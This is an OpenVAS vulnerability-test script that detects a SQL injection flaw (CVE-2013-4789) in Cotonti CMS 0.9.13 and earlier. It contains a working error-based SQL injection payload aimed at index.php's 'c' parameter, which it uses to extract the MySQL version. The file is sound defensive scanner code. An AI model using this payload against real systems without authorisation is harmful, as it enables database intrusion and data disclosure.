###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cotonti_sql_inj_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# Cotonti 'c' Parameter SQL Injection Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "
  Impact Level: Application";

if(description)
{
  script_id(803848);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2013-4789");
  script_bugtraq_id(61538);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-08-05 17:34:41 +0530 (Mon, 05 Aug 2013)");
  script_name("Cotonti 'c' Parameter SQL Injection Vulnerability");

  tag_summary =
"This host is running Cotonti and is prone to SQL Injection vulnerability.";

  tag_vuldetect =
"Send a crafted sql query via HTTP GET request and check whether it is able to
get the mysql version or not.";

  tag_insight =
"Input passed via the 'c' parameter to index.php (when 'e' is set to
'rss') is not properly sanitised before being used in a SQL query.";

  tag_impact =
"Successful exploitation will allow an attacker to inject or manipulate SQL
queries in the back-end database, allowing for the manipulation or disclosure
of arbitrary data.";

  tag_affected =
"Cotonti version 0.9.13 and prior";

  tag_solution =
"Upgrade to version 0.9.14 or higher,
For updates refer to http://www.cotonti.com";

  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "impact" , value : tag_impact);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://www.osvdb.com/95842");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/54289");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2013/Aug/1");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/27287");
  script_xref(name : "URL" , value : "https://www.htbridge.com/advisory/HTB23164");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/122639/cotonti0913-sql.txt");
  script_xref(name : "URL" , value : "http://exploitsdownload.com/exploit/php/cotonti-0913-sql-injection-vulnerability");
  script_summary("Check if Cotonti is vulnerable to sql injection");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
req = "";
res = "";
url = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Iterate over the possible directories
foreach dir (make_list("", "/cotonti", "/cms", cgi_dirs()))
{
  ## Request for the index.php
  sndReq = http_get(item:string(dir, "/index.php"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq);

  ## confirm the application
  if("Cotonti<" >< rcvRes && ">Stay tuned" >< rcvRes)
  {
    ## Construct Attack Request
    url = dir + "/index.php?e=rss&c='and(select%201%20from(select%20count(*)"+
                ",concat((select%20concat(version())),floor(rand(0)*2))x%20f"+
                "rom%20information_schema.tables%20group%20by%20x)a)and'";

    ## Try attack and check the response to confirm vulnerability
    if(http_vuln_check(port:port, url:url,
       pattern:"SQL error 23000: .*Duplicate entry.*group_key",
       extra_check:make_list('Fatal error', 'database.php')))
    {
      security_hole(port);
      exit(0);
    }
  }
}
